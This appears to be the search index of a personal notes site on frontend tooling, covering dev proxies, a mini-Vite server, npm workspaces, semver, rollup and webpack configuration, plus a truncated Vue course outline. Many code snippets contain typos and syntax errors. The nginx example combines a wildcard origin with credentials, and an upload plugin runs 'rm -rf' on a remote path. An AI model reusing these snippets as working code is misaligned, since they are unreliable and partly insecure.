node\u4ee3\u7406\u670d\u52a1\u5668(webpack-dev-server\u914d\u7f6e\u539f\u7406) <pre><code>const {createProxyMiddleware} = require('http-proxy-middleware')\n// \u5c06\u9759\u6001\u8d44\u6e90\u548c\u4ee3\u7406\u5728\u540c\u4e00\u670d\u52a1\u5668\napp.use(express.static('./client'))  // working directory as root\n\napp.use('/api', createProxyMiddleware({\n  target:\"http://localhost:8000\",\n  pathRewrite:{\n    '^/api': ''\n  }\n}))\n\napp.listen(9000,()=&gt;{console.log('server start on port 9000')}\n</code></pre></p> webpack.config.js<pre><code>devServer: {\n    proxy: [\n      {\n        context: ['/api'],\n        target: 'http://localhost:3000',\n        changeOrigin: true, // \u9a8c\u8bc1\u8bf7\u6c42\u6765\u6e90\n      },\n    ]\n}\n</code></pre> <ul> <li> nginx\u53cd\u5411\u4ee3\u7406</li> </ul> nginx.conf<pre><code>http {\n  server {\n    listen 80;\n    location / {\n      add-header Access-Control-Allow-Origin *;\n      add-header Access-Control-Allow-Crendential true;\n      if ($request_method = \"OPTIONS\") {\n        return 204; # no content\n      }\n      proxy_pass http://localhost:8000\n    }\n  }\n}\n</code></pre> <p>Not practical in project dev jsonp websocket postMessage</p>"},{"location":"tool-chain/debug/","title":"Debug","text":"<ul> <li>sourceMap</li> <li>chrome \u65ad\u70b9\u8c03\u8bd5</li> <li>vue/react devtools</li> </ul>"},{"location":"tool-chain/mini-vite/","title":"Mini vite","text":"<p>node\u670d\u52a1\u5668\uff0c\u5904\u7406\u6d4f\u89c8\u5668\u5404\u79cd\u8d44\u6e90\u7684\u52a0\u8f7d</p> <ul> <li>\u5bbf\u4e3b\u9875</li> <li>js\u6587\u4ef6\u52a0\u8f7d</li> <li>\u88f8\u6a21\u5757\u6587\u4ef6\u8def\u5f84\u91cd\u5199\u548c\u52a0\u8f7d</li> <li>\u89e3\u6790SFC</li> <li>\u4ee3\u7801\u751f\u6210</li> </ul> <pre><code>&lt;body&gt;\n    &lt;script&gt;\n    window.process = {\n       NODE_ENV = 'dev'\n    }\n    &lt;/script&gt;\n&lt;/body&gt;\n</code></pre> <pre><code>const Koa = require(\"koa\")\nconst app = new Koa()\nconst fs = require(\"fs\")\nconst paht = require(\"path\")\n\napp.use(ctx =&gt; {\n  const {url} = ctx.request\n  if (url === '/'){\n   ctx.type = \"text/html\"\n   ctx.body = readFileSync('./index.html', 'utf-8')\n  } else if (url.endsWith('.js')) {\n    const p = path.join(__dirname, url)\n    ctx.type = \"application/javascript\"\n    ctx.body = rewriteImport(refs.readFileSync(p,'utf-8'))\n  } else if (url.startsWith('/@modules/'){\n    // \u53d6\u5f97\u6a21\u5757\u540d\u79f0\n    const moduleName = url.replace('/@modules/', '')\n    // \u53bbnode_modules\u76ee\u5f55\u4e2d\u627e\n    const prefix = path.join(__dirname, \"../node_modules\", moduleName)\n    // package.json\u4e2d\u53d6\u5f97module\u5b57\u6bb5\n    const moduleField = require(prefix + \"package.json\").module\n    const filePath = path.join(prefix, module)\n    const fileContent = fs.readFileSync(filePath, \"utf-8\")\n    ctx.type = \"application/javascript\"\n    ctx.body = rewriteImport(fileContent)\n  } else if (url.indexOf('.vue' &gt; -1) {\n    const p = path.join(__dirname, url)\n    const fileContent = fs.readFileSync(p, 'utf-8')\n    const fileParsed = compulerSFC.parse(fileContent)\n    ctx.type = \"application/javascript\"\n    ctx.body = fileParsed\n  }\n})\n\nfunction rewriteImport(content) {\n  return content.replace(\" from ['\"](.*)['\"]\", (match, p) =&gt; {\n    if(p.startsWith('./') || p.startsWith('../') ||p.startsWith('/')) {\n      return match\n    } else {\n       return ` from '/@modules/${p}'`\n    }\n    })\n}\n\n\napp.listen(3000, ()=&gt; {\n  console.log(\"kvite startup!!!\")\n})\n</code></pre>"},{"location":"tool-chain/npm/","title":"npm cli","text":""},{"location":"tool-chain/npm/#cli-commands","title":"cli commands","text":"<p>installed package and register to a package.json file as dependencies <code>npm install --save-prod</code> <code>npm install --save-dev</code></p>"},{"location":"tool-chain/npm/#npm-link","title":"npm link","text":"<ul> <li> <code>npm link</code></li> </ul> <p>1.<code>npm link</code> in a package folder with no arguments will create a symlink in the global folder {prefix}/lib/node_modules/ that links to the package where the npm link command was executed. 2. it will also link any bins in the package to {prefix}/bin/{name}. Note that npm link uses the global prefix (see npm prefix -g for its value). <pre><code>\u279c  bin ls -l Users/ayao/.nvm/versions/node/v22.4.1/bin/\nquarte -&gt; ../lib/node_modules/@quarte/cli/bin/cli.js\n</code></pre>"},{"location":"tool-chain/npm/#packagemanager","title":"packageManager","text":"<pre><code>{\n  \"packageManager\": \"pnpm@9.6.0\"\n}\n</code></pre>"},{"location":"tool-chain/npm/#workspace-usage","title":"Workspace Usage","text":"<p><code>npm link &lt;pkg&gt; --workspace &lt;name&gt;</code></p> <p><code>npm link --workspace &lt;name&gt;</code></p>"},{"location":"tool-chain/npm/#enterprise-practice","title":"enterprise practice","text":"<pre><code>{\n  \"worksapces\": {\n    \"packages/@vue/*\",\n    \"packages/test/*\",\n    \"packages/vue-cli-version-marker\"\n  }\n}\n</code></pre>"},{"location":"tool-chain/npm/#npmrc","title":".npmrc","text":""},{"location":"tool-chain/npm/#semver","title":"semver","text":""},{"location":"tool-chain/npm/#npm-install","title":"npm install","text":"<p>npm install saves any specified packages into dependencies by default. Additionally, you can control where and how they get saved with some additional flags:</p> <pre><code>     \u2022   -P, --save-prod: Package will appear in your dependencies. This is the default unless -D or -O are present.\n\n     \u2022   -D, --save-dev: Package will appear in your devDependencies.\n\n     \u2022   -O, --save-optional: Package will appear in your optionalDependencies.\n\n     \u2022   --no-save: Prevents saving to dependencies.\n</code></pre>"},{"location":"tool-chain/npm/#npm","title":"npm\u914d\u7f6e\u6587\u4ef6\u5b57\u6bb5\u89e3\u6790","text":""},{"location":"tool-chain/npm/#imports","title":"imports","text":"<ul> <li> built-in lib imports</li> </ul> <pre><code>{\n  \"imports\": {\n    \"#ansi-styles\": \"./source/vendor/ansi-style/index.js\",\n    \"#supports-color\": {\n      \"node\": \"./source/vendor/supports-color/node.js\",\n      \"browser\": \"./source/vendor/supports-color/browser.js\"\n    }\n  }\n}\n</code></pre>"},{"location":"tool-chain/npm/#scirpts","title":"scirpts","text":"<p>node_modules/.bin</p> <p><pre><code>{\n  \"sciprts\": {\n    \"build\": \"webpack\"\n  }\n}\n</code></pre> <pre><code>npx webpack\n</code></pre></p>"},{"location":"tool-chain/npm/#_1","title":"\u5305\u4f9d\u8d56\u7ba1\u7406","text":"<p><code>dependencies</code> <code>devDependencies</code> <code>peerDependencies</code></p>"},{"location":"tool-chain/npm/#semantic-versioning-specification","title":"Semantic Versioning Specification","text":""},{"location":"tool-chain/npm/#document","title":"document","text":"<p> consider\u5f53\u524d\u7248\u672c<code>1.0.0</code>,\u53d1\u5e03\u66f4\u65b0 <pre><code>patch (1.0.1) #make backward compatible bug fixes\nMinor (1.1.0) # add functionality in a backward compatible manner\nMajor (2.0.0) # when you make incompatible API changes\n---- prelease ----\nPrepatch (1.0.0-alpha.0)\nPreminor (1.1.0-alpha.0)\nPremajor (2.0.0-alpah.0)\n</code></pre></p>"},{"location":"tool-chain/npm/#rapid-development-and-fast-iteration","title":"rapid development and fast iteration","text":"<p>start your initial development release at 0.1.0 and then increment the minor version for each subsequent release.</p> <p>Note</p> <ul> <li> <p>we propose a simple set of rules and requirements that dictate how version numbers are assigned and incremented.</p> </li> <li> <p>Consider a version format of X.Y.Z (Major.Minor.Patch). Bug fixes not affecting the API increment the patch version, backward compatible API additions/changes increment the minor version, and backward incompatible API changes increment the major version.</p> </li> <li> <p>Once a versioned package has been released, the contents of that version MUST NOT be modified. Any modifications MUST be released as a new version.</p> </li> </ul>"},{"location":"tool-chain/npm/#foramt-specification","title":"foramt specification","text":"<pre><code>&lt;valid semver&gt; ::= &lt;version core&gt;\n                 | &lt;version core&gt; \"-\" &lt;pre-release&gt;\n                 | &lt;version core&gt; \"+\" &lt;build&gt;\n                 | &lt;version core&gt; \"-\" &lt;pre-release&gt; \"+\" &lt;build&gt;\n</code></pre>"},{"location":"tool-chain/npm/#node-semver-implementation","title":"node-semver implementation","text":"<p><code>bin/semver.js</code> <pre><code>const argv = process.argv.slice(2)\n\n\nconst versions = []\n\nconst main = () =&gt; {\n  if(argv.length) return help()\n  // normalizeCommandLineOptions or Command-line argument parsing\n  while(argv.lenght) {\n    // --version=1.0.0\n    let option = argv.shift()\n    const idxOfEqualSign = option.indexOf(\"=\")\n    if(idxOfEqualSign &gt; -1) {\n      const val = option.slice(idxOfEqualSign + 1)\n      option = option.slice(0,idxOfEqualSign)\n      argv.unshift(val)\n    }\n  }\n\n  switch(option) {\n    case '-v': case '--version':\n      versions.push(argv.shift())\n      break\n  }\n}\n\nconst help = () =&gt; console.log(\n  `\n  A JavaScript implementation of the https://semver.org/ specification\n\n  Usage: semver [options] &lt;version&gt; [&lt;version&gt; [...]]\n\n  Options:\n  -r --range &lt;range&gt;\n          Print versions that match the specified range\n  `\n)\n\nmain()\n</code></pre></p>"},{"location":"tool-chain/npm/#multi-package-management","title":"multi-package management","text":"<p>Workspaces is a generic term that refers to the set of features in the npm cli that provides support to managing multiple packages from your local files system from within a singular top-level, root package.</p>"},{"location":"tool-chain/npm/#configure-workspace","title":"configure workspace","text":"<p>\"upward lookup\": from the currnet directory, looking for a directory containing <code>node_modules</code> directory</p> <p><code>npm init --workspace</code>: get symlinked to the <code>node_modules</code> folder of the current working dir.</p> <pre><code>{\n  \"workspaces\": [\"./packages/*\"]\n  \"publishConfig\": { // when using a scope,\n    \"access\": \"public\"\n  },\n  \"bin\": {\n    \"4am\": \".src/cli.js\" // bin Package has an executable.\n  }\n}\n</code></pre>"},{"location":"tool-chain/npm/#add-dependencies-to-a-specific-packageworkspace","title":"add dependencies to a specific (package/workspace)","text":"<p><code>npm i import-local -w packages/cli --include-workspace-root</code>s</p>"},{"location":"tool-chain/npm/#running-commands-in-the-context-of-workspaces","title":"Running commands in the context of workspaces","text":"<p><code>npm run test --workspaces --if-present</code></p>"},{"location":"tool-chain/npm/#cache","title":"cache","text":""},{"location":"tool-chain/npm/#scope","title":"scope","text":"<ul> <li> Installing scoped packages</li> </ul> <p>scoped modules will be installed in <code>node_modules/@myorg/pkgnmae</code></p> <p>A scoped package is installed by referencing it by name, preceded by an @ symbol, in npm install:</p> <ul> <li> Requiring scoped packages</li> </ul> <p>you have to include the name of the scope when requiring them in your code</p> <ul> <li> Publishing scoped packages</li> </ul> <p>Scoped packages are not public by default. You will need to specify --access public with the initial npm publish command. or set access to public <code>publishConfig.access</code> file in <code>package.json</code></p> <p>URL-safe characters All npm packages have a name. Some package names also have a scope scopes are preceded by an @ symbol and followed by a slash</p>"},{"location":"tool-chain/npm/#how-npm-handle-script-field","title":"how npm handle script field","text":""},{"location":"tool-chain/npm/#pre-post-scripts","title":"Pre &amp; Post Scripts","text":"<p><code>npm run &lt;script&gt;</code> find exeuctable in <code>node_modules/.bin</code> and run Pre and post commands with matching names will be run for those as well</p>"},{"location":"tool-chain/npm/#file-field-in-packagejson","title":"file field in package.json","text":"<p>describes the entries to be included when your package is installed as a dependency Certain files are always included, regardless of settings: - package.json - README - LICENSE / LICENCE - The file in the \"main\" field - The file(s) in the \"bin\" field</p>"},{"location":"tool-chain/pkg-manage/","title":"Pkg manage","text":""},{"location":"tool-chain/pkg-manage/#npm","title":"npm","text":"<ul> <li>npm\u7684\u5b89\u88c5 \u5168\u5c40\uff1a \u547d\u4ee4\u884c\u5de5\u5177 <pre><code>npm install nodemon -g\n\n#\u7f6e\u9876\u7248\u672c\nnpm install vue@3.0.0\n</code></pre></li> </ul>"},{"location":"tool-chain/pkg-manage/#monoreop","title":"monoreop \u5b9e\u73b0\u65b9\u6848","text":"<ul> <li>lerna + yarn workspace</li> <li>pnpm</li> </ul>"},{"location":"tool-chain/pkg-manage/#_1","title":"\u811a\u624b\u67b6","text":"<p>vue-cli create-react-app dva umi</p>"},{"location":"tool-chain/resource-loading/","title":"Resource loading","text":"<p>CSP Speculation Rules API</p>"},{"location":"tool-chain/resource-loading/#script-loading-and-execution-timing","title":"script loading and execution timing","text":"<ul> <li>  tag, it can\u2019t continue building the DOM. It must execute the script right now. The same happens for external scripts : the browser must wait for the script to download, execute the downloaded script, and only then can it process the rest of the page. <p>That leads to two important issues:</p> <p>1.Scripts can\u2019t see DOM elements below them, so they can\u2019t add handlers etc.</p> <p>2.If there\u2019s a bulky script at the top of the page, it \u201cblocks the page\u201d. Users can\u2019t see the page content till it downloads and runs:</p>"},{"location":"tool-chain/resource-loading/#type-attribue","title":"type attribue <p>The value of this attribute indicates_ the type of data represented by the script, and will be one of the following: import</p> <ul> <li>Attribute is not set (default), an empty string, or a JavaScript MIME type</li> <li>text/javascript: is a legacy value and used as the default if you omit the type attribute in a script tag</li> <li> <p>application/javascript: is recommended for current browsers.</p> </li> <li> <p>importmap</p> </li> <li>module</li> <li>speculationrules</li> </ul>","text":""},{"location":"tool-chain/resource-loading/#importmap","title":"importmap","text":"<p>control how the browser resolves module specifiers when importing JavaScript modules.</p> <ul> <li> <p> bare module</p> </li> <li> <p> Mapping path prefixes</p> </li> </ul> <p>in this case the property and mapped path must both have a trailing forward slash (/)</p> <pre><code>&lt;script type=\"importmap\"&gt;\n  {\n    \"imports\": {\n      \"@/\": path.join(__dirname, './src/')\n    },\n    \"scopes\": {\n    }\n  }\n&lt;/script&gt;\n`\n\n\n```js\n// classic, module, importmap, speculationrules\nif(HTMLScriptElement.supports(\"importmap\")){\n\n}\n</code></pre> <ol> <li> <p>script tag \u21a9</p> </li> <li> <p>HTMLScriptElement \u21a9</p> </li> </ol>"},{"location":"tool-chain/rollup/","title":"\u5236\u9020rollup","text":""},{"location":"tool-chain/rollup/#_1","title":"\u524d\u7aef\u6a21\u5757\u5316\u89c4\u8303","text":"<ul> <li>CommonJS</li> <li>AMD</li> <li>UMD</li> <li>ESM</li> </ul>"},{"location":"tool-chain/rollup/#rollup_1","title":"\u6a21\u5757\u6253\u5305\u5de5\u5177rollup","text":""},{"location":"tool-chain/rollup/#_2","title":"\u6253\u5305\u683c\u5f0f","text":"<p>amd cjs esm iife umd</p> <pre><code>./node_modules/.bin/rollup -i src/index.js -o dist/bundle.es.js -f es\n</code></pre> <p><code>rollup.config.js</code></p> <pre><code>export default {\n  input: \"./src/index.js\",\n  output: {\n    file:\"./dist/es.min.js\",\n    format: \"esm\"\n  }\n}\n</code></pre>"},{"location":"tool-chain/rollup/#_3","title":"\u6a21\u5757","text":"<pre><code>class Module {\n  constructor({code, path, bundle}) {\n\n  }\n}\n</code></pre>"},{"location":"tool-chain/rollup/#_4","title":"\u6253\u5305","text":"<p><code>rollup/lib/bundle.js</code></p> <p><pre><code>const path = require('path'')\nclass Bundle {\n  constructor({entry}){\n    // ext less\n    this.entryPath = entry.replace(/\\.js$/,'') + '.js'\n    this.entryName=\n  }\n  /**\n    *\n    * @param importee\n    * @param importer\n  */\n  fetchModule(importee, importer) {\n\n\n    route = path.resolve(\n      path.dirname(importer),\n      importee.replace(/\\.js$/,'') + '.js'\n    )\n\n    code = fs.readFileSync(route, 'utf-8').toString()\n  }\n  generate() {\n    if ( statement.type = \"ExportNameDeclaration\") {\n      source.remove(statement.start, statement.delcaration.start)\n    }\n  }\n}\n\nmodule.exports = Bundle\n</code></pre> <code>rollup/lib/__test__/bundle.spec.js</code> <pre><code>const Bundle = require('../bundle')\n\ndescribe(\"bundle test\", () =&gt; {\n  test(\"fecthModule\", ()=&gt; {\n    const bundle = new Bundle({entry:'./.js'))\n    fs.readFileSync.mockReturnValueOnce()\n    bundle.fetchModule()\n  })\n})\n</code></pre></p>"},{"location":"tool-chain/test/","title":"Test","text":""},{"location":"tool-chain/test/#coverage","title":"\u8986\u76d6\u7387\uff08coverage)","text":"<p>LinCoverage/SegmentCoverage/BlockCoverage</p> <p>BranchCoverage All-EdgesCoverages PathOverage</p>"},{"location":"tool-chain/test/#e2e","title":"E2E\u7aef\u5230\u7aef\u9a8c\u8bc1\u6d4b\u8bd5","text":""},{"location":"tool-chain/webpack/","title":"wepack","text":"<p>transpiled(through loaders),module bundler and more one reason why we introduce</p>"},{"location":"tool-chain/webpack/#specifier-resolve","title":"specifier resolve","text":"<p><code>&lt;script&gt;: type attribute</code> - [x] importmap</p>"},{"location":"tool-chain/webpack/#sourcemap","title":"sourcemap","text":"<p>debug your source code instead of deployed code .."},{"location":"tool-chain/webpack/#sourcemap_1","title":"\u542f\u7528sourcemap","text":"<p>main.js.map<pre><code>{\n  \"sources\": [\n    \"webpack://source_map/.src/utils/parse.js\",\n    \"webpack://source_map/.src/utils/covert.js\",\n    \"webpack://source_map/.src/utils/format.js\",\n    \"webpack://source_map/.src/utils/main.js\"\n  ]\n}\n</code></pre> enable source map in chrome devtool </p>"},{"location":"tool-chain/webpack/#_1","title":"\u503c\u7684\u7ec4\u5408","text":"<p>[inline-|eval-|hidden-][nosource-][cheap-[module-]]source-map</p>"},{"location":"tool-chain/webpack/#_2","title":"\u6700\u4f73\u5b9e\u8df5","text":"<p>\u5f00\u53d1\u9636\u6bb5\uff1a<code>source-map</code>(vue\u7684\u9009\u62e9) or <code>cheap-module-source-map</code>(react\u7684\u9009\u62e9)</p> <p><code>//# sourceURL =</code> comment tell browser the source file</p> <p>webpack.config.js<pre><code>{\n  \"mode\": \"production\",\n  \"devtool\":\"source-map\"\n}\n{\n  \"mode\": \"development\",\n  \"devtool\":\"eval\"\n}\n\n\u4e0d\u751f\u6210\u5217\u6620\u5c04(column mapping)\n{\n  \"mode\": \"development\",\n  \"devtool\":\"cheap-source-map\"\n}\n\n\n{\n  \"mode\": \"production\",\n  \"devtool\":\"hidden-source-map\"\n}\n`//# sourceMappingURL=bundle.js.map` add manually\n\n\n{\n  \"mode\": \"production\",\n  \"devtool\":\"nosource-source-map\"\n}\n</code></pre> \u6709source code debug info: .. \u4e0d\u751f\u6210\u6e90\u4ee3\u7801 <p>\u6253\u5305\u538b\u7f29\u6df7\u6dc6\u7684\u4ee3\u7801\u4e0e\u6e90\u4ee3\u7801\u7684\u6620\u5c04 \u7b2c\u51e0\u884c\u7b2c\u51e0\u5217\u62a5\u9519</p>"},{"location":"tool-chain/webpack/#_3","title":"\u642d\u5efa\u672c\u5730\u5f00\u53d1\u670d\u52a1\u5668","text":"<ul> <li>webpack watch mode</li> <li>webpack devServer</li> <li> <p>webpkack middleware</p> </li> <li> <p> devServer usage via cli</p> </li> </ul> <p>@webpack &gt; API &gt; COMMAND LINE Interface &gt; Commands &gt; Serve</p> <pre><code>{\n  \"scripts\":{\n    \"serve\": \"webpack serve --config webpack.config.js --stats verbose\"\n    h\n  }\n}\n</code></pre> <ul> <li> host\u914d\u7f6e</li> </ul> <p>\u83b7\u53d6\u5185\u7f51ip <pre><code>ifconfig en0 | grep inet\n</code></pre></p> <p><code>localhost</code>: <code>/etc/hosts</code>\u914d\u7f6e\u6587\u4ef6dnslookup\u4e3a127.0.0.1(\u56de\u73af\u5730\u5740,\u4e3b\u673a\u53d1\u51fa\u7684\u5305\uff0c\u88ab\u81ea\u5df1\u63a5\u6536)</p> <p><code>0.0.0.0</code>:  listen for requests from the network, not just localhost \u5185\u7f51\u534f\u4f5c\uff0c\u4ece\u624b\u673a\u8bbf\u95ee</p> <ul> <li> \u4ee3\u7406\u548c\u8de8\u57df</li> </ul> <p>A request to <code>http://localhost:8000/api/music/search/artists</code></p> <p>will now proxy the request to -&gt;</p> <p><code>http://localhost:3000/music/search/artists</code></p> <p><code>changeOrigin</code>: true \u4fee\u6539\u8bf7\u6c42\u5934\u7684host\u5b57\u6bb5\u4e3a<code>target|forward</code>\uff0c\u865a\u62df\u4e3b\u673a\u548c\u53cd\u722c <pre><code>host: &lt;backend API host&gt;\n</code></pre> \u6e90\u7801\u5b9e\u73b0 <code>@npm &gt; http-proxy &gt; lib &gt;http-proxy &gt; common.js</code> <pre><code>if(options.changeOrigin){\n  outgoing.headers.host =\n    required(outgoing.port, options[forward || 'target'].protocol)\n    &amp;&amp; !hasPort(outgoing.port)\n    ? outgoing.host + \":\" + outgoing.port\n    : outgoing.host\n}\n</code></pre></p> <ul> <li> \u9759\u6001\u8d44\u6e90\u914d\u7f6e</li> </ul> <p>serve a file in <code>assets/manifest.json</code> at <code>/serve-public-path-url/manifest.json</code>,</p> <ul> <li> \u5b8c\u6574\u914d\u7f6e</li> </ul> webpack.config.js<pre><code>module.exports = {\n  devServer: {\n    hot:true,// \u7f16\u8bd1\u9519\u8bef\u4fee\u590d\u540e\u91cd\u65b0\u52a0\u8f7d\u9875\u9762\n    host: 0.0.0.0,\n    port: 8000,\n    compress: true,\n    open:{\n      app: {\n        name:\"Firefox Developer Edition\",\n        arguments:[\"--new-window\"],\n        compress:true\n      }\n    },\n    proxy:[\n      {\n        context:['/api'],\n        target:'http://localhost:3000',\n        pathRewrite:{'^/api':''},\n        changeOrigin: true\n      }\n    ],\n    // \u9759\u6001\u8d44\u6e90\n    static: {\n      directory: path.join(__dirname, 'assets'),\n      publicPath: 'public'\uff0c\n    },\n    historyApiFallback:true\n  }\n}\n</code></pre>"},{"location":"tool-chain/webpack/#_4","title":"\u6027\u80fd\u4f18\u5316","text":"<ul> <li> \u4ee3\u7801\u5206\u5272code spliting \u4ee3\u7801\u5206\u5305\u7684\u5fc5\u8981\u6027</li> <li>prevent duplication</li> </ul>"},{"location":"tool-chain/webpack/#resource-hint","title":"Resource Hint","text":"<p>Using these inline directives while declaring your imports allows webpack to output \u201cResource Hint\u201d</p> <p><code>/* webpackPrefetch: true */</code> -&gt; <code>&lt;link rel=\"prefetch\"/&gt;</code></p> <p><code>prefetch</code>: resource is probably needed for next navigation <code>preload</code>: resource will also be needed during the current navigation pref</p>"},{"location":"tool-chain/webpack/#cdn","title":"CDN\u52a0\u901f","text":"<p>CDN\u670d\u52a1\u5668\uff1aunpkg\u3001JSDeliver\u3001cdnjs\u3001bootcdn</p> <p>import.meta.url,  document.currentScript,  script.src  self.location</p> <pre><code>const CDN_PATH = process.env.CDN_PATH || /\n\nmodule.exports = {\n  output: {\n    publicPath: CDN_PATH\n  },\n  externals:{\n    axios: \"axios\"\n  }\n}\n</code></pre>"},{"location":"tool-chain/webpack/#caching","title":"Caching","text":"<p>clients (typically browsers) will hit that server to grab the site and its assets. The last step can be time consuming, which is why browsers use a technique called caching.</p> <p>the configuration needed to ensure files produced by webpack compilation can remain cached unless their content has changed.</p> <ul> <li>outputFilename</li> <li>Extracting Boilerplate</li> <li>Module Identifiers</li> <li>Conclusion</li> </ul> <pre><code>module.exports = {\n  output: {\n    filename:'[name].[contenthash].js',\n    clean:true\n  }\n}\n</code></pre> <ul> <li> <code>optimization.splitChunks.cacheGroups</code></li> </ul> <p>extract 3-party libraries(less likely to change), such as <code>lodash</code> or <code>react</code>, to a separate vendor chunk(Dll) This can be done by using the cacheGroups option of the SplitChunksPlugin</p> <p>Note</p> <p>dll option will be removed. Webpack 4 should provide good enough perf and the cost of maintaining DLL mode inside Vue CLI is no longer justified.  RFC: beta.10, Upgrading to webpack 4 + vue-loader 15 #1205 </p> <pre><code>module.exports = {\n  optimization: {\n    splitChunks: {\n      cacheGroups: {\n        vendor: {\n          test:/[\\\\/]node_modules[\\\\/]/,\n          name: \"vendor.js\"\n        },\n      }\n    }\n  }\n}\n</code></pre> <p>run our build to see new 'vender' bundle</p>"},{"location":"tool-chain/webpack/#_5","title":"\u73af\u5883\u914d\u7f6e\u7684\u5206\u79bb","text":"<pre><code>{\n  \"scripts\": {\n    \"build\": \"wepack\",\n    \"serve\": \"webpack serve --config common.config.js --env development\"\n  }\n}\n</code></pre> common.config.js<pre><code>const path = require('path')\nconst merge = require('wepack-merge')\nconst devConfig = require('./dev.config')\nconst pordConfig = require('./prod.config')\n\nconst commonConfig = {\n  resolve: {\n    alias: {\n      \"@\": path.resolve(__dirname,'src/')\n    },\n    extensions:['ts','js','jsx','vue',]\n    // fullySpecified: true,\n  }\n}\nmodule.exports = (env,argv) =&gt; {\n  return merge(commonConfig, prodConfig)\n}\n</code></pre> prod.config.js<pre><code>\n</code></pre> dev.config.js<pre><code>module.exports = {\n  devServer: {\n    port: 3000,\n    open: {\n      app: {\n        name: \"Firefox Developer Edition\"\n      }\n    },\n    compress: true,\n    proxy: [\n      {\n        context:['/api'],\n        target: \"http://localhost:8000\",\n        pathRewrite:{\"^/api\": \"\"},\n        changeOrigin: true\n      }\n    ],\n    static: {\n      directory: path.join(__dirname, 'public'),\n      publicPath: 'public'\n    }\n  }\n}\n</code></pre>"},{"location":"tool-chain/webpack/#tree-shaking","title":"Tree-shaking","text":"<p>You can imagine your application as a tree. The source code and libraries you actually use represent the green, living leaves of the tree. Dead code represents the brown, dead leaves of the tree that are consumed by autumn. In order to get rid of the dead leaves, you have to shake the tree, causing them to fall.</p> <p>dead-code elimination no sideffect unused module export detection</p> <p><code>sideEffects</code> flag field in <code>package.json</code> <pre><code>{\n  \"sideEffects\":[\"**/*.css\",\"**/*.scss\"]\n}\n</code></pre> <code>optimization</code> flag file in <code>prod.config.js</code> <pre><code>const TerserPlugin = require('terser-webpack-plugin')\n\nmodules.exports = {\n  optimization: {\n    usedExports: true, // unused harmony export &lt;func&gt; comment\n    sideEffects: true,\n    minimize:true,\n    minimizer: [\n      new TerserPlugin({\n\n      })\n    ]\n  }\n}\n</code></pre></p>"},{"location":"tool-chain/webpack/#_6","title":"\u538b\u7f29","text":"<ul> <li> html compress</li> </ul> <pre><code>const HtmlWebpackPlugin = require('html-webpack-plugin');\nmodule.exports = {\n  plugins: [\n    new HtmlWebpackPlugin({\n      template:\n    })\n  ]\n}\n</code></pre> <pre><code>Accept-Encoding: gzip\n</code></pre> <pre><code>Content-Encoding: gzip\n</code></pre>"},{"location":"tool-chain/webpack/#_7","title":"\u81ea\u5b9a\u4e49\u63d2\u4ef6","text":"<ul> <li> \u4e0a\u4f20\u5230\u9759\u6001\u8d44\u6e90\u670d\u52a1\u5668 <pre><code>const {NodeSSh} = require(\"node-ssh\")\n\nclass AutoUploadWebpackPlugin {\n\n  constructor(options) {\n    this.options = options\n    this.ssh = new NodeSSH()\n  }\n\n  apply(compiler) {\n    compiler.hooks.afterEmit.tapAsync(\"AutoPlugin\",async (compilation, cb) =&gt; {\n      const localPath = compilation.outputOptions.path\n    // \u5efa\u7acb\u670d\u52a1\u5668\u94fe\u63a5\n    this.ssh.connectServer()\n\n    // \u6e05\u7a7a\u539f\u6709\u5185\u5bb9\n\n    this.ssh.execCommand(\"rm -rf \" + this.options.remotePath)\n\n\n    // \u4e0a\u4f20\u6587\u4ef6\n    await this.uploadFiles(localPath, remotePath)\n\n    // \u65ad\u5f00\u94fe\u63a5\n    this.ssh.dispose()\n  }\n\n  connectServer() {\n    this.ssh.connect({\n      host: this.options.host,\n      port: this.options.port,\n      password: this.options.password\n    })\n  }\n  uploadFiles(localPath, remotePath) {\n    this.ssh.putDirectory(localPath,remotePath, {\n      recursive: true\n    })\n  }\n}\n</code></pre> <pre><code>new AutoUploadWebpackPlugin({\n  port:,\n  password: process.env.,\n  host:,\n})\n</code></pre> nginx\u914d\u7f6e <code>/etc/nginx/conf.d/webpack.conf</code> <code>`txt server {   listen 7878;   location / {     root /root/projects/yesplaymusic/build;     index.html;   } }</code></li> </ul>"},{"location":"tool-chain/webpack/#webpack","title":"\u5236\u9020webpack","text":""},{"location":"vue/","title":"Vue\u6e90\u7801\u89e3\u8bfb","text":"<ul> <li>Reactivity</li> <li>runtime-dom / runtime-core</li> <li>compiler-dom / compiler-core</li> </ul>"},{"location":"vue/hands-on-reactivity/","title":"Hands on reactivity","text":"<p>\u25cf \u4ece\u96f6\u642d\u5efa vue3 \u5f00\u53d1\u73af\u5883, \u8be6\u89e3 vue \u8bbe\u8ba1\u7406\u5ff5\u548c\u8bbe\u8ba1\u67b6\u6784 \u25cf \u624b\u5199 vue3 \u54cd\u5e94\u5f0f\u539f\u7406, reactive, effect, watch, computed, ref \u539f\u7406 \u25cf \u638c\u63e1 vue3 \u6e90\u7801\u8c03\u8bd5\u6280\u5de7,\u638c\u63e1\u54cd\u5e94\u5f0f\u6570\u7ec4,map,set \u5904\u7406 \u25cf \u624b\u5199\u81ea\u5b9a\u4e49\u6e32\u67d3\u5668\u539f\u7406,\u4ee5\u53ca runtimeDOM \u4e2d\u5c5e\u6027,\u4e8b\u4ef6\u5904\u7406 \u25cf \u624b\u5199\u865a\u62df dom \u539f\u7406,\u624b\u5199 vue3 \u4e2d diff \u7b97\u6cd5\u53ca\u6700\u957f\u9012\u589e\u5b50\u5e8f\u5217\u5b9e\u73b0\u539f\u7406 \u25cf \u624b\u5199\u7ec4\u4ef6\u6e32\u67d3\u539f\u7406,\u7ec4\u4ef6\u6302\u8f7d\u6d41\u7a0b,\u53ca\u5f02\u6b65\u6e32\u67d3\u539f\u7406 \u25cf \u624b\u5199 vue3 \u4e2d\u751f\u547d\u5468\u671f\u539f\u7406,props,emits, slot, provide, inject \u5b9e\u73b0\u539f\u7406 \u25cf \u8be6\u89e3 vue3 \u7f16\u8bd1\u4f18\u5316,patchFlags,blockTree, \u5b9e\u73b0\u9776\u5411\u66f4\u65b0 \u25cf \u6a21\u7248\u8f6c\u5316 ast \u8bed\u6cd5\u6811, \u638c\u63e1\u8bed\u6cd5\u6811\u4f18\u5316\u53ca\u4ee3\u7801\u751f\u6210\u539f\u7406 \u25cf \u624b\u5199 vue3 \u4e2d\u5f02\u6b65\u7ec4\u4ef6\u539f\u7406,\u51fd\u6570\u5f0f\u7ec4\u4ef6,teleport,keep-alive,transition \u7ec4\u4ef6 \u25cf \u624b\u5199 pinia \u4ee5\u53ca vueRouter \u5b9e\u73b0\u539f\u7406 \u25cf 